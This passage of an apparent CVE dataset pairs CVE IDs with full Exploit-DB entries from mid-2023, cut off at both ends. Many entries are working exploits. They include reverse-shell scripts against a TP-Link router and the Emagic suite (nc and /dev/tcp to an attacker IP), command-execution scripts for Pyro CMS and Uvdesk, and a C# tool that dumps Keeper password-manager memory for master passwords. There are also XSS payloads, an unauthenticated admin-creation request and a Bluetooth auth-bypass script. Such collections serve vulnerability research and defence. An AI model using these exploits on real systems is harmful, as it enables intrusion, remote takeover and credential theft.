(x86)\TSplus-RemoteWork\Clients\www\software\java\third\sha256.js C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\third\js\prototype\prototype.js C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\js\jquery.min.js"
CVE-2023-31069,"{""CVE-2023-31069"": 1}",2023-08-21,TSPlus 16.0.0.0 - Remote Work Insecure Credential storage,https://www.exploit-db.com/exploits/51681,"Exploit Title: TSPlus 16.0.0.0 - Remote Work Insecure Credential storage Date: 2023-08-09 Exploit Author: Carlo Di Dato for Deloitte Risk Advisory Italia Vendor Homepage: <URL> Version: Up to 16.0.0.0 Tested on: Windows CVE : CVE-2023-31069 With TSPlus Remote Work (v. 16.0.0.0) you can create a secure single sign-on web portal and remote desktop gateway that enables users to remotely access the console session of their office PC. It is possible to create a custom web portal login page which allows a user to login without providing their credentials. However, the credentials are stored in an insecure manner since they are saved in cleartext, within the html login page. This means that everyone with an access to the web login page, can easely retrieve the credentials to access to the application by simply looking at the html code page. This is a code snippet extracted by the source code of the login page (var user and var pass): var user = ""Admin""; // Login to use when connecting to the remote server (leave """" to use the login typed in this page) var pass = ""SuperSecretPassword""; // Password to use when connecting to the remote server (leave to use the password typed in this page) var domain = ; // Domain to use when connecting to the remote server (leave """" to use the domain typed in this page) var server = ""127.0.0.1""; // Server to connect to (leave to use localhost and/or the server chosen in this page) var port = ; // Port to connect to (leave """" to use localhost and/or the port of the server chosen in this page) var lang = ""as_browser""; // Language to use var serverhtml5 = ""127.0.0.1""; // Server to connect to, when using HTML5 client var porthtml5 = ""3389""; // Port to connect to, when using HTML5 client var cmdline = """"; // Optional text that will be put in the server's clipboard once connected"
CVE-2023-37759,"{""CVE-2023-37759"": 1}",2023-08-21,Crypto Currency Tracker (CCT) 9.5 - Admin Account Creation (Unauthenticated),https://www.exploit-db.com/exploits/51688,"Exploit Title: Crypto Currency Tracker (CCT) 9.5 - Admin Account Creation (Unauthenticated) Date: 11.08.2023 Exploit Author: 0xBr Software Link: <URL> Version: <=9.5 CVE: CVE-2023-37759 POST /en/user/register HTTP/2 Host: localhost Cookie: XSRF-TOKEN=[TOKEN]; laravelsession=[LARAVELSESSION]; SELECTEDCURRENCY=USD; SELECTEDCURRENCYPRICE=1; cookieconsentstatus=dismiss Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8 Accept-Language: en-GB,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 756 token=[TOKEN]&name=testing&roleid=1&email=testing%40testing.testing&password=testing&g-recaptcha-response=[G-RECAPTCHA-RESPONSE]&submitregister=Register"
CVE-2022-47636,"{""CVE-2022-47636"": 1}",2023-08-10,OutSystems Service Studio 11.53.30 - DLL Hijacking,https://www.exploit-db.com/exploits/51678,"Exploit Title: OutSystems Service Studio 11.53.30 - DLL Hijacking Date: 2023-08-09 Exploit Author: Carlo Di Dato for Deloitte Risk Advisory Italia Vendor Homepage: <URL> Version: Up to 11.53.30 (Build 61739) Tested on: Windows CVE : CVE-2022-47636 A DLL hijacking vulnerability has been discovered in OutSystems Service Studio 11 11.53.30 build 61739. When a user open a .oml file (OutSystems Modeling Language), the application will load the following DLLs from the same directory: av_libGLESv2.dll libcef.DLL user32.dll d3d10warp.dll Using a crafted DLL, it is possible to execute arbitrary code in the context of the current logged in user."
CVE-2023-1389,"{""CVE-2023-1389"": 1}",2023-08-10,TP-Link Archer AX21 - Unauthenticated Command Injection,https://www.exploit-db.com/exploits/51677,"#!/usr/bin/python3 Exploit Title: TP-Link Archer AX21 - Unauthenticated Command Injection Date: 07/25/2023 Exploit Author: Voyag3r ( <URL> Vendor Homepage: <URL> Version: TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219 ( <URL> Tested On: Firmware Version 2.1.5 Build 20211231 rel.73898(5553); Hardware Version Archer AX21 v2.0 CVE: CVE-2023-1389 Disclaimer: This script is intended to be used for educational purposes only. Do not run this against any system that you do not have permission to test. The author will not be held responsible for any use or damage caused by this program. CVE-2023-1389 is an unauthenticated command injection vulnerability in the web management interface of the TP-Link Archer AX21 (AX1800), specifically, in the country parameter of the write callback for the country form at the # ""/cgi-bin/luci/;stok=/locale"" endpoint. By modifying the country parameter it is possible to run commands as root. Execution requires sending the request twice; the first request sets the command in the country value, and the second request # (which can be identical or not) executes it. This script is a short proof of concept to obtain a reverse shell. To read more about the development of this script, you can read the blog post here: # <URL> Before running the script, start a nc listener on your preferred port -> run the script -> profit import requests, urllib.parse, argparse from requests.packages.urllib3.exceptions import InsecureRequestWarning Suppress warning for connecting to a router with a self-signed certificate requests.packages.urllib3.disablewarnings(InsecureRequestWarning) Take user input for the router IP, and attacker IP and port parser = argparse.ArgumentParser() parser.addargument(""-r"", ""--router"", dest = ""router"", default = ""192.168.0.1"", help=""Router name"") parser.addargument(""-a"", ""--attacker"", dest = ""attacker"", default = ""127.0.0.1"", help=""Attacker IP"") parser.addargument(""-p"", ""--port"",dest = ""port"", default = ""9999"", help=""Local port"") args = parser.parseargs() Generate the reverse shell command with the attacker IP and port revshell = urllib.parse.quote(""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "" + args.attacker + "" "" + args.port + "" >/tmp/f"") URL to obtain the reverse shell urlcommand = "" <URL> + args.router + ""/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$("" + revshell + "")"" Send the URL twice to run the command. Sending twice is necessary for the attack r = requests.get(urlcommand, verify=False) r = requests.get(urlcommand, verify=False)"
CVE-2023-4168,"{""CVE-2023-4168"": 1}",2023-08-08,Adlisting Classified Ads 2.14.0 - WebPage Content Information Disclosure,https://www.exploit-db.com/exploits/51667,"Exploit Title: Adlisting Classified Ads 2.14.0 - WebPage Content Information Disclosure Exploit Author: CraCkEr Date: 25/07/2023 Vendor: Templatecookie Vendor Homepage: <URL> Software Link: <URL> Version: 2.14.0 Tested on: Windows 10 Pro Impact: Sensitive Information Leakage CVE: CVE-2023-4168 #Description Information disclosure issue in the redirect responses, When accessing any page on the website, Sensitive data, such as API keys, server keys, and app IDs, is being exposed in the body of these redirects. #Steps to Reproduce: When you visit any page on the website, like: <URL> <URL> <URL> in the body page response there's information leakage for googlemapkey apikey authdomain projectid storagebucket messagingsenderid appid measurementid Note: The same information leaked, such as the API keys, server keys, and app ID, was added to the ""Firebase Push Notification Configuration"" in the Administration Panel. Settings of ""Firebase Push Notification Configuration"" in the Administration Panel, on this Path: <URL> (Login as Administrator) [-] Done"
CVE-2023-29689,"{""CVE-2023-29689"": 1}",2023-08-08,Pyro CMS 3.9 - Server-Side Template Injection (SSTI) (Authenticated),https://www.exploit-db.com/exploits/51669,"Exploit Title: Pyro CMS 3.9 - Server-Side Template Injection (SSTI) (Authenticated) Exploit Author: Daniel Barros () - Hakai Offensive Security Date: 03/08/2023 Vendor: <URL> Software Link: <URL> Vulnerable Version(s): 3.9 CVE: CVE-2023-29689 Notes: You need a user who has access to /admin privilege Example Usage: First, run the script: python3 CVE-2023-29689.py Please follow these steps: 1. Enter the application URL: <URL> 2. Enter the email for authentication: admin.com 3. Enter the password: Admin@ 4. Enter the command to be executed: id Result of command execution: uid=1000(cupcake) gid=1000(cupcake) groups=1000(cupcake) import requests from bs4 import BeautifulSoup from urllib.parse import urljoin def login(session, url, email, password): loginurl = urljoin(url, '/admin/login') response = session.get(loginurl) soup = BeautifulSoup(response.content, 'html.parser') token = soup.find('input', {'name': 'token'})['value'] payload = { 'token': token, 'email': email, 'password': password session.post(loginurl, data=payload) Function to edit role 1 and extract the Description of the Admin user. def editroleandextractdescription(session, url, command): editroleurl = urljoin(url, '/admin/users/roles/edit/1') response = session.get(editroleurl) soup = BeautifulSoup(response.content, 'html.parser') token = soup.find('input', {'name': 'token'})['value'] payload = { 'token': token, 'nameen': 'Admin', 'slug': 'admin', 'descriptionen': f'{[""{command}""]|map(""system"")|join}', 'action': 'saveexit' session.post(editroleurl, data=payload) Extract the updated Description from role 1. response = session.get(urljoin(url, '/admin/users/roles')) soup = BeautifulSoup(response.content, 'html.parser') description = soup.find('td', {'data-title': 'Description'}).text.strip() return description def main(): url = input(""Enter the application URL: "") email = input(""Enter the email for authentication: "") password = input(""Enter the password : "") command = input(""Enter the command to be executed: "") with requests.Session() as session: login(session, url, email, password) description = editroleandextractdescription(session, url, command) print(""\nResult of command execution:"") print(description) if name == ""main"": main()"
CVE-2023-4173,"{""CVE-2023-4173"": 1}",2023-08-08,mooSocial 3.1.8 - Reflected XSS,https://www.exploit-db.com/exploits/51670,"Exploit Title: mooSocial 3.1.8 - Reflected XSS Exploit Author: CraCkEr Date: 28/07/2023 Vendor: mooSocial Vendor Homepage: <URL> Software Link: <URL> Version: 3.1.8 Tested on: Windows 10 Pro Impact: Manipulate the content of the site CVE: CVE-2023-4173 #Greetings The_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob #Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials URL path folder is vulnerable to XSS <URL> <URL> XSS Payloads: ijz3y""> y4apk [-] Done"
CVE-2023-4174,"{""CVE-2023-4174"": 1}",2023-08-08,Social-Commerce 3.1.6 - Reflected XSS,https://www.exploit-db.com/exploits/51671,"Exploit Title: Social-Commerce 3.1.6 - Reflected XSS Exploit Author: CraCkEr Date: 28/07/2023 Vendor: mooSocial Vendor Homepage: <URL> Software Link: <URL> Version: 3.1.6 Tested on: Windows 10 Pro Impact: Manipulate the content of the site CVE: CVE-2023-4174 #Greetings ThePitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob #Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /search/index GET parameter 'q' is vulnerable to XSS <URL> URL path folder [1,2] is vulnerable to XSS <URL> <URL> <URL> <URL> <URL> XSS Payloads: j8chn""> ridxm [-] Done"
CVE-2023-37569,"{""CVE-2023-37569"": 1}",2023-08-08,Emagic Data Center Management Suite v6.0 - OS Command Injection,https://www.exploit-db.com/exploits/51673,"#!/bin/bash Exploit Title: Emagic Data Center Management Suite v6.0 - OS Command Injection Date: 03-08-2023 Exploit Author: Shubham Pandey & thewhiteh4t Vendor Homepage: <URL> Version: 6.0.0 Tested on: Kali Linux CVE : CVE-2023-37569 URL=$1 LHOST=$2 LPORT=$3 echo """" echo "" ESDS eMagic 6.0.0 RCE "" echo "" > CVE-2023-37569 "" echo "" > Shubham & thewhiteh4t "" echo """" if [ $# -lt 3 ]; then echo "" USAGE : ./exploit.sh <URL> <URL> 192.168.0.20 1337 exit 1 fi url=""$1/index.php/monitor/operations/utilities/"" echo ""[+] URL : $URL"" echo ""[+] LHOST : $LHOST"" echo ""[+] LPORT : $LPORT"" echo payload=""bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F$LHOST%2F$LPORT%200%3E%261%27"" postdata=""utility=ping&operations=yes&hostname=%3B%20$payload¶mbefore=¶mafter=&probeid=1&rndval=1682490204846"" echo ""[!] Triggering exploit."" echo $url (sleep 3; curl -s -X POST -d $post_data $url > /dev/null) & echo ""[+] Catching shell."" nc -lvp 4444"
CVE-2023-33383,"{""CVE-2023-33383"": 1}",2023-08-04,Shelly PRO 4PM v0.11.0 - Authentication Bypass,https://www.exploit-db.com/exploits/51657,"#!/bin/bash Exploit Title: Shelly PRO 4PM v0.11.0 - Authentication Bypass Google Dork: NA Date: 2nd August 2023 Exploit Author: The Security Team [exploitsecurity.io] Exploit Blog: <URL> Vendor Homepage: <URL> Software Link: NA Version: Firmware v0.11.0 (REQUIRED) Tested on: MacOS/Linux CVE : CVE-2023-33383 IFS= failed=$false RED=""\e[31m"" GREEN=""\e[92m"" WHITE=""\e[97m"" ENDCOLOR=""\e[0m"" substring=""Connection refused"" banner() clear echo -e ""${GREEN}[+][+]"" echo -e ""${GREEN}| Author : Security Team [${RED}exploitsecurity.io${ENDCOLOR}] |"" echo -e ""${GREEN}| Description: Shelly PRO 4PM - Out of Bounds |"" echo -e ""${GREEN}| CVE: CVE-2023-33383 |"" echo -e ""${GREEN}[+][+]"" echo -e ""${GREEN}[Enter key to send payload]${ENDCOLOR}"" banner read -s -n 1 key if [ ""$key"" = ""x"" ]; then exit 0; elif [ ""$key"" = """" ]; then gattout=$(sudo timeout 5 gatttool -b c8:f0:9e:88:92:3e --primary) if [ -z ""$gattout"" ]; then echo -e ""${RED}Connection timed out${ENDCOLOR}"" exit 0; else sudo gatttool -b c8:f0:9e:88:92:3e --char-write-req -a 0x000d -n 00000001 >/dev/null 2>&1 echo -ne ""${GREEN}[Sending Payload]${ENDCOLOR}"" sleep 1 if [ $? -eq 1 ]; then $failed=$true exit 0; fi sudo gatttool -b c8:f0:9e:88:92:3e --char-write-req -a 0x0008 -n ab >/dev/null 2>&1 sleep 1 if [ $? -eq 1 ]; then $failed=$true echo -e ""${RED}[Exploit Failed]${ENDCOLOR}"" exit 0; else sudo gatttool -b c8:f0:9e:88:92:3e --char-write-req -a 0x0008 -n abcd >/dev/null 2>&1 sleep 1 for i in {1..5} do echo -ne ""${GREEN}."" sleep 1 done echo -e ""\n${WHITE}[Pwned!]${ENDCOLOR}"" fi fi fi"
CVE-2023-36306,"{""CVE-2023-36306"": 1}",2023-08-04,Adiscon LogAnalyzer v.4.1.13 - Cross Site Scripting,https://www.exploit-db.com/exploits/51643,"Exploit Title: Adiscon LogAnalyzer v.4.1.13 - Cross Site Scripting Date: 2023.Aug.01 Exploit Author: Pedro (ISSDU TW) Vendor Homepage: <URL> Software Link: <URL> Version: v4.1.13 and before Tested on: Linux CVE : CVE-2023-36306 There are several installation method. If you installed without database(File-Based),No need to login. If you installed with database, You should login with Read Only User(at least) XSS Payloads are as below: XSS <URL> address]/loganalyzer/asktheoracle.php?type=domain&query=&uid=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E <URL> address]/loganalyzer/chartgenerator.php?type=2&byfield=syslogseverity&width=400&%%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E=123 <URL> address]/loganalyzer/details.php/%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E <URL> address]/loganalyzer/index.php/%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E <URL> address]/loganalyzer/search.php/%22%3E%3Cscript%3Ealert('xss')%3C/script%3E <URL> address]/loganalyzer/export.php/%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E <URL> address]/loganalyzer/reports.php/%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E <URL> address]/loganalyzer/statistics.php/%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E"
CVE-2023-37979,"{""CVE-2023-37979"": 1}",2023-08-04,WordPress Plugin Ninja Forms 3.6.25 - Reflected XSS,https://www.exploit-db.com/exploits/51644,"Exploit Title: WordPress Plugin Ninja Forms 3.6.25 - Reflected XSS (Authenticated) Google Dork: inurl:/wp-content/plugins/ninja-forms/readme.txt Date: 2023-07-27 Exploit Author: Mehran Seifalinia Vendor Homepage: <URL> Software Link: <URL> Version: 3.6.25 Tested on: Windows 10 CVE: CVE-2023-37979 from requests import get from sys import argv from os import getcwd import webbrowser from time import sleep Values: url = argv[-1] if url[-1] == ""/"": url = url.rstrip(""/"") Constants CVENAME = ""CVE-2023-37979"" VULNERABLEVERSION = ""3.6.25"" HTML template HTMLTEMPLATE = f"" {CVENAME} Ninja-forms reflected XSS ({CVENAME}) Created by Mehran Seifalinia "" /> After click on the button, If you received a 0 or received an empty page in browser , that means you need to login first. Github LinkedIn "" def exploit(): with open(f""{CVENAME}.html"", ""w"") as"
CVE-2023-4112,"{""CVE-2023-4112"": 1}",2023-08-04,PHPJabbers Shuttle Booking Software 1.0 - Reflected XSS,https://www.exploit-db.com/exploits/51648,"Exploit Title: PHPJabbers Shuttle Booking Software 1.0 - Reflected XSS Exploit Author: CraCkEr Date: 20/07/2023 Vendor: PHPJabbers Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Windows 10 Pro Impact: Manipulate the content of the site CVE: CVE-2023-4112 #Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /index.php URL parameter is vulnerable to RXSS <URL> bwude?controller=pjAdmin&action=pjActionLogin&err=1"
CVE-2023-4113,"{""CVE-2023-4113"": 1}",2023-08-04,PHPJabbers Service Booking Script 1.0 - Reflected XSS,https://www.exploit-db.com/exploits/51649,"Exploit Title: PHPJabbers Service Booking Script 1.0 - Reflected XSS Exploit Author: CraCkEr Date: 21/07/2023 Vendor: PHPJabbers Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Windows 10 Pro Impact: Manipulate the content of the site CVE: CVE-2023-4113 #Greetings The_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob #Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /index.php GET parameter 'index' is vulnerable to RXSS <URL>"
CVE-2023-4114,"{""CVE-2023-4114"": 1}",2023-08-04,PHPJabbers Night Club Booking 1.0 - Reflected XSS,https://www.exploit-db.com/exploits/51650,"Exploit Title: PHPJabbers Night Club Booking 1.0 - Reflected XSS Exploit Author: CraCkEr Date: 21/07/2023 Vendor: PHPJabbers Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Windows 10 Pro Impact: Manipulate the content of the site CVE: CVE-2023-4114 #Greetings ThePitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob #Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /index.php GET parameter 'index' is vulnerable to RXSS <URL>"
CVE-2023-4115,"{""CVE-2023-4115"": 1}",2023-08-04,PHPJabbers Cleaning Business 1.0 - Reflected XSS,https://www.exploit-db.com/exploits/51651,"Exploit Title: PHPJabbers Cleaning Business 1.0 - Reflected XSS Exploit Author: CraCkEr Date: 21/07/2023 Vendor: PHPJabbers Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Windows 10 Pro Impact: Manipulate the content of the site CVE: CVE-2023-4115 #Greetings The_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob #Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /index.php GET parameter 'index' is vulnerable to RXSS <URL> [-] Done"
CVE-2023-4116,"{""CVE-2023-4116"": 1}",2023-08-04,PHPJabbers Taxi Booking 2.0 - Reflected XSS,https://www.exploit-db.com/exploits/51652,"Exploit Title: PHPJabbers Taxi Booking 2.0 - Reflected XSS Exploit Author: CraCkEr Date: 22/07/2023 Vendor: PHPJabbers Vendor Homepage: <URL> Software Link: <URL> Version: 2.0 Tested on: Windows 10 Pro Impact: Manipulate the content of the site CVE: CVE-2023-4116 #Greetings The_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob #Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /index.php GET parameter 'index' is vulnerable to RXSS <URL> [-] Done"
CVE-2023-4117,"{""CVE-2023-4117"": 1}",2023-08-04,PHPJabbers Rental Property Booking 2.0 - Reflected XSS,https://www.exploit-db.com/exploits/51653,"Exploit Title: PHPJabbers Rental Property Booking 2.0 - Reflected XSS Exploit Author: CraCkEr Date: 22/07/2023 Vendor: PHPJabbers Vendor Homepage: <URL> Software Link: <URL> Version: 2.0 Tested on: Windows 10 Pro Impact: Manipulate the content of the site CVE: CVE-2023-4117 #Greetings ThePitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob #Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /index.php GET parameter 'index' is vulnerable to RXSS <URL> [-] Done"
CVE-2023-4119,"{""CVE-2023-4119"": 1}",2023-08-04,Academy LMS 6.0 - Reflected XSS,https://www.exploit-db.com/exploits/51654,"Exploit Title: Academy LMS 6.0 - Reflected XSS Exploit Author: CraCkEr Date: 22/07/2023 Vendor: Creativeitem Vendor Homepage: <URL> Software Link: <URL> Version: 6.0 Tested on: Windows 10 Pro Impact: Manipulate the content of the site CVE: CVE-2023-4119 #Greetings ThePitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob #Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /academy/home/courses GET parameter 'query' is vulnerable to XSS <URL> Path: /academy/home/courses GET parameter 'sortby' is vulnerable to XSS <URL> XSS Payloads (Blocked) : ldt4d""> nuydd XSS Payload Bypass Filter : cplvz""> fk4ap [-] Done"
CVE-2023-39115,"{""CVE-2023-39115"": 1}",2023-08-04,Campcodes Online Matrimonial Website System v3.3 - Code Execution via malicious SVG file upload,https://www.exploit-db.com/exploits/51656,"Exploit Title: Online Matrimonial Website System v3.3 - Code Execution via malicious SVG file upload Date: 3-8-2023 Category: Web Application Exploit Author: Rajdip Dey Sarkar Version: 3.3 Tested on: Windows/Kali CVE: CVE-2023-39115 Description: An arbitrary file upload vulnerability in Campcodes Online Matrimonial Website System Script v3.3 allows attackers to execute arbitrary code via uploading a crafted SVG file. SVG Payload - Steps to reproduce -Login with your creds -Navigate to this directory - /profile-settings -Click on Gallery -> Add New Image -> Browser -> Add Files -Choose the SVG file and upload done -Click the image!! Payload Triggered Burp Request POST /Matrimonial%20Script/install/aiz-uploader/upload HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-CSRF-TOKEN: I5gqfipOOKWwI74hfdtFC2kpUP0EggWb8Qf7Xd5E Content-Type: multipart/form-data; boundary=-167707198418121100152548123485 Content-Length: 1044 Origin: <URL> Connection: close Referer: <URL> Cookie: session=5GnMKaOhppEZivuzZJFXQLdldLMXecD1hmcEPWjg; acceptCookies=true; XSRF-TOKEN=I5gqfipOOKWwI74hfdtFC2kpUP0EggWb8Qf7Xd5E Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin -167707198418121100152548123485 Content-Disposition: form-data; name=""relativePath"" null -167707198418121100152548123485 Content-Disposition: form-data; name=""name"" file (1).svg -167707198418121100152548123485 Content-Disposition: form-data; name=""type"" image/svg+xml -167707198418121100152548123485 Content-Disposition: form-data; name=""aizfile""; filename=""file (1).svg"" Content-Type: image/svg+xml -167707198418121100152548123485--"
CVE-2023-2796,"{""CVE-2023-2796"": 1}",2023-08-04,Wordpress Plugin EventON Calendar 4.4 - Unauthenticated Event Access,https://www.exploit-db.com/exploits/51658,"Exploit Title: Wordpress Plugin EventON Calendar 4.4 - Unauthenticated Event Access Date: 03.08.2023 Exploit Author: Miguel Santareno Vendor Homepage: <URL> Version: 4.4 Tested on: Google and Firefox latest version CVE : CVE-2023-2796 1. Description The plugin lacks authentication and authorization in its eventonicsdownload ajax action, allowing unauthenticated visitors to access private and password protected Events by guessing their numeric id. 2. Proof of Concept ("
CVE-2023-3219,"{""CVE-2023-3219"": 1}",2023-08-04,Wordpress Plugin EventON Calendar 4.4 - Unauthenticated Post Access via IDOR,https://www.exploit-db.com/exploits/51659,"Exploit Title: Wordpress Plugin EventON Calendar 4.4 - Unauthenticated Post Access via IDOR Date: 03.08.2023 Exploit Author: Miguel Santareno Vendor Homepage: <URL> Version: 4.4 Tested on: Google and Firefox latest version CVE : CVE-2023-3219 1. Description The plugin does not validate that the eventid parameter in its eventonics_download ajax action is a valid Event, allowing unauthenticated visitors to access any Post (including unpublished or protected posts) content via the ics export functionality by providing the numeric id of the post. 2. Proof of Concept ("
CVE-2023-39147,"{""CVE-2023-39147"": 1}",2023-07-31,Uvdesk v1.1.3 - File Upload Remote Code Execution (RCE) (Authenticated),https://www.exploit-db.com/exploits/51639,"Exploit Title: Uvdesk v1.1.3 - File Upload Remote Code Execution (RCE) (Authenticated) Date: 28/07/2023 Exploit Author: Daniel Barros () - Hakai Offensive Security Vendor Homepage: <URL> Software Link: <URL> Version: 1.1.3 Example: python3 CVE-2023-39147.py -u "" <URL> -c ""whoami"" CVE : CVE-2023-39147 Tested on: Ubuntu 20.04.6 import requests import argparse def getargs(): parser = argparse.ArgumentParser() parser.addargument('-u', '--url', required=True, action='store', help='Target url') parser.addargument('-c', '--command', required=True, action='store', help='Command to execute') myargs = parser.parseargs() return myargs def main(): args = getargs() baseurl = args.url command = args.command uploadedfile = ""shell.php"" urlcmd = baseurl + ""//assets/knowledgebase/shell.php?cmd="" + command Edit your credentials here logindata = { ""username"": ""admin.com"", ""password"": ""passwd"", ""rememberme"": ""off"" files = { ""name"": (None, ""pwn""), ""description"": (None, ""xxt""), ""visibility"": (None, ""public""), ""solutionImage"": (uploadedfile, "" "", ""image/jpg"") s = requests.session() Login s.post(baseurl + ""/en/member/login"", data=logindata) Upload uploadresponse = s.post(baseurl + ""/en/member/knowledgebase/folders/new"", files=files) Execute command cmd = s.get(urlcmd) print(cmd.text) if name == ""main"": main()"
CVE-2023-36266,"{""CVE-2023-36266"": 1}",2023-07-28,Keeper Security desktop 16.10.2 &amp; Browser Extension 16.5.4 - Password Dumping,https://www.exploit-db.com/exploits/51623,"Exploit Title: Keeper Security desktop 16.10.2 & Browser Extension 16.5.4 - Password Dumping Google Dork: NA Date: 22-07-2023 Exploit Author: H4rk3nz0 Vendor Homepage: <URL> Software Link: <URL> Version: Desktop App version 16.10.2 & Browser Extension version 16.5.4 Tested on: Windows CVE : CVE-2023-36266 using System; using System.Management; using System.Diagnostics; using System.Linq; using System.Runtime.InteropServices; using System.Text; using System.Text.RegularExpressions; using System.Collections.Generic; static class Program public static string GetCommandLine(this Process process) if (process is null || process.Id < 1) return """"; string query = $@""SELECT CommandLine FROM Win32Process WHERE ProcessId = {process.Id}""; using (var searcher = new ManagementObjectSearcher(query)) using (var collection = searcher.Get()) var managementObject = collection.OfType ().FirstOrDefault(); return managementObject != null ? (string)managementObject[""CommandLine""] : """"; public static void extractcredentials(string text) int index = text.IndexOf(""{\""title\"":\""""); int eindex = text.IndexOf(""}""); while (index >= 0) try int endIndex = Math.Min(index + eindex, text.Length); Regex reg = new Regex(""(\\{\""title\""[ -~]+\\}(?=\\s))""); string match = reg.Match(text.Substring(index - 1, endIndex - index)).ToString(); int matchcut = match.IndexOf(""} ""); if (matchcut != -1 ) match = match.Substring(0, matchcut + ""} "".Length).TrimEnd(); if (!stringsList.Contains(match) && match.Length > 20) Console.WriteLine(""->Credential Record Found : "" + match.Substring(0, matchcut + ""} "".Length) + ""\n""); stringsList.Add(match); } else if (!stringsList.Contains(match.TrimEnd()) && match.Length > 20) Console.WriteLine(""->Credential Record Found : "" + match + ""\n""); stringsList.Add(match.TrimEnd()); index = text.IndexOf(""{\""title\"":\"""", index + 1); eindex = text.IndexOf(""}"", eindex + 1); catch return; public static void extractaccount(string text) int index = text.IndexOf(""{\""expiry\""""); int eindex = text.IndexOf(""}""); while (index >= 0) try int endIndex = Math.Min(index + eindex, text.Length); Regex reg = new Regex(""(\\{\""expiry\""[ -~]+@[ -~]+(?=\\}).)""); string match = reg.Match(text.Substring(index - 1, endIndex - index)).ToString(); if ((match.Length > 2)) Console.WriteLine(""->Account Record Found : "" + match + ""\n""); return; index = text.IndexOf(""{\""expiry\"""", index + 1); eindex = text.IndexOf(""}"", eindex + 1); catch return; public static void extractmaster(string text) int index = text.IndexOf(""datakey""); int eindex = index + 64; while (index >= 0) try int endIndex = Math.Min(index + eindex, text.Length); Regex reg = new Regex(""(datakey[ -~]+)""); var matchone = reg.Match(text.Substring(index - 1, endIndex - index)).ToString(); Regex clean = new Regex(""([a-zA-z]{1,14}[a-zA-Z]{1,10})""); if (matchone.Replace(""datakey"", """").Length > 5) if (!clean.IsMatch(matchone.Replace(""datakey"", """") Console.WriteLine(""->Master Password : "" + matchone.Replace(""datakey"", """") + ""\n""); index = text.IndexOf(""datakey"", index + 1); eindex = index + 64; catch return; public static List stringsList = new List (); static void Main(string[] args) foreach (var process in Process.GetProcessesByName(""keeperpasswordmanager"")) string commandline = GetCommandLine(process); if (commandline.Contains(""--renderer-client-id=5"") || commandline.Contains(""--renderer-client-id=7"")) Console.WriteLine(""->Keeper Target PID Found: {0}"", process.Id.ToString()); Console.WriteLine(""->Searching.\n""); IntPtr processHandle = OpenProcess(0x00000400 | 0x00000010, false, process.Id); IntPtr address = new IntPtr(0x10000000000); MEMORYBASICINFORMATION memInfo = new MEMORYBASICINFORMATION(); while (VirtualQueryEx(processHandle, address, out memInfo, (uint)Marshal.SizeOf(memInfo)) != 0) if (memInfo.State == 0x00001000 && memInfo.Type == 0x20000) byte[] buffer = new byte[(int)memInfo.RegionSize]; if (NtReadVirtualMemory(processHandle, memInfo.BaseAddress, buffer, (uint)memInfo.RegionSize, IntPtr.Zero) == 0x0) string text = 